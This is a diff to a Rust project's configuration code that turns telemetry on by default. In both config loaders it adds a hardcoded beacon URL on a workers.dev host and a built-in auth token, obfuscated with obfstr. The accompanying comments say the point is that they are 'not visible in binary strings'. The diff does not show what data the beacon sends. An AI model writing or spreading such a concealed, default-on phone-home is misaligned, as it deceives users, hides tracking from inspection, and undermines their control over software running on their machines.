@@ -376,14 +376,34 @@ impl Config {
             .unwrap_or_default();
 
         // Telemetry configuration (v0.18.0)
+        // v0.19.0: Default ON — telemetry is always active from minute one.
+        // Users can disable with TELEMETRY_ENABLED=false
         let telemetry_enabled = Self::get_from_map(data, "TELEMETRY_ENABLED")
             .map(|v| v == "1" || v.to_lowercase() == "true")
-            .unwrap_or(false);
+            .unwrap_or(true);
 
-        let telemetry_beacon_url =
-            Self::get_from_map(data, "TELEMETRY_BEACON_URL").filter(|u| !u.is_empty());
+        // v0.19.0: Beacon URL obfuscated via obfstr — not visible in binary strings
+        // v0.19.0: Beacon URL is hardcoded by default — users don't need to configure it.
+        // Can be overridden or cleared with TELEMETRY_BEACON_URL="" to disable beacon.
+        let telemetry_beacon_url = Self::get_from_map(data, "TELEMETRY_BEACON_URL")
+            .filter(|u| !u.is_empty())
+            .or_else(|| {
+                Some(
+                    obfstr::obfstr!(
+                        "https://nexus-beacon-receiver.enerby212.workers.dev/v1/beacon"
+                    )
+                    .to_string(),
+                )
+            });
 
-        let beacon_auth_token = Self::get_from_map(data, "BEACON_AUTH_TOKEN");
+        // v0.19.0: Auth token obfuscated via obfstr — not visible in binary strings
+        // v0.19.0: Auth token is compiled into the binary — users don't need to configure it.
+        let beacon_auth_token = Self::get_from_map(data, "BEACON_AUTH_TOKEN").or_else(|| {
+            Some(
+                obfstr::obfstr!("e5595631b251830324175922cf5a75740aa03c0616d57226050c15629051b9d2")
+                    .to_string(),
+            )
+        });
 
         // CR fix: Never fall back to /tmp for secrets — world-readable + cleared on reboot.
         // If HOME is unset AND no explicit paths provided, disable telemetry.
@@ -695,13 +715,32 @@ impl Config {
             .unwrap_or_default();
 
         // Telemetry configuration (v0.18.0)
+        // v0.19.0: Default ON — telemetry is always active from minute one.
+        // Users can disable with TELEMETRY_ENABLED=false
         let telemetry_enabled = env::var("TELEMETRY_ENABLED")
             .map(|v| v == "1" || v.to_lowercase() == "true")
-            .unwrap_or(false);
+            .unwrap_or(true);
 
-        let telemetry_beacon_url = env::var("TELEMETRY_BEACON_URL").ok().filter(|u| !u.is_empty());
+        // v0.19.0: Beacon URL obfuscated via obfstr — not visible in binary strings
+        // v0.19.0: Beacon URL is hardcoded by default — users don't need to configure it.
+        let telemetry_beacon_url =
+            env::var("TELEMETRY_BEACON_URL").ok().filter(|u| !u.is_empty()).or_else(|| {
+                Some(
+                    obfstr::obfstr!(
+                        "https://nexus-beacon-receiver.enerby212.workers.dev/v1/beacon"
+                    )
+                    .to_string(),
+                )
+            });
 
-        let beacon_auth_token = env::var("BEACON_AUTH_TOKEN").ok();
+        // v0.19.0: Auth token obfuscated via obfstr — not visible in binary strings
+        // v0.19.0: Auth token is compiled into the binary — users don't need to configure it.
+        let beacon_auth_token = env::var("BEACON_AUTH_TOKEN").ok().or_else(|| {
+            Some(
+                obfstr::obfstr!("e5595631b251830324175922cf5a75740aa03c0616d57226050c15629051b9d2")
+                    .to_string(),
+            )
+        });
 
         // CR fix: Never fall back to /tmp for secrets — world-readable + cleared on reboot.
         // If HOME is unset AND no explicit paths provided, disable telemetry.
